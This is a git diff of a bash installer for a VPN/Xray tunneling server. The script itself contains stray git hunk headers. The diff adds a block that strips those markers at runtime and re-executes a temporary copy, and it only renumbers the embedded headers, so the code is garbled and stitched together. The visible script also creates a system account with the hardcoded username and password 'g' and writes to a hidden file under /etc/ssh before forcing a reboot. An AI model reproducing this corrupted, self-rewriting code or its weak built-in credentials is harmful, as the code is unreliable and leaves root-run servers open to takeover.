@@ -1,4 +1,11 @@
 #!/bin/bash
+# Auto-recover if file accidentally contains git patch markers (e.g. @@, diff --git)
+if grep -qE '^(@@|diff --git |index |\+\+\+ |--- )' "$0"; then
+  tmp_clean="$(mktemp)"
+  awk '!/^(@@|diff --git |index |\+\+\+ |--- )/' "$0" > "$tmp_clean"
+  chmod +x "$tmp_clean"
+  exec "$tmp_clean" "$@"
+fi
 apt upgrade -y
 apt update -y
 apt install -y curl
@@ -55,7 +62,7 @@ Username="g"
 Password=g
 mkdir -p /home/script/
 useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
-@@ -420,81 +420,82 @@ echo "& plughin Account" >>/etc/ssh/.ssh.db
+@@ -420,81 +427,82 @@ echo "& plughin Account" >>/etc/ssh/.ssh.db
 }
 function install_xray() {
 clear
@@ -138,7 +145,7 @@ LimitNOFILE=1000000
 WantedBy=multi-user.target
 
 EOF
-@@ -546,80 +547,83 @@ chmod +x /etc/rc.local
+@@ -546,80 +554,83 @@ chmod +x /etc/rc.local
 systemctl enable rc-local
 systemctl start rc-local.service
 echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6
@@ -222,7 +229,7 @@ systemctl stop udp-mini-3
 systemctl enable udp-mini-3
 systemctl start udp-mini-3
 print_success "files Quota Service"
-@@ -950,26 +954,25 @@ echo -e "\e[95;1m Telegram : @WintunelingVPNN \e[0m"
+@@ -950,26 +961,25 @@ echo -e "\e[95;1m Telegram : @WintunelingVPNN \e[0m"
 echo ""
 echo -e "\e[94;1m╔═════════════════════════════════════════════════╗\e[0m"
 echo -e "\e[92;1m                  ----[ INSTALL SUCCESS ]----                 \e[0m"
@@ -247,3 +254,4 @@ echo -e ""
 echo ""
 read -p "[ Enter ]  TO REBOOT"
 reboot
+
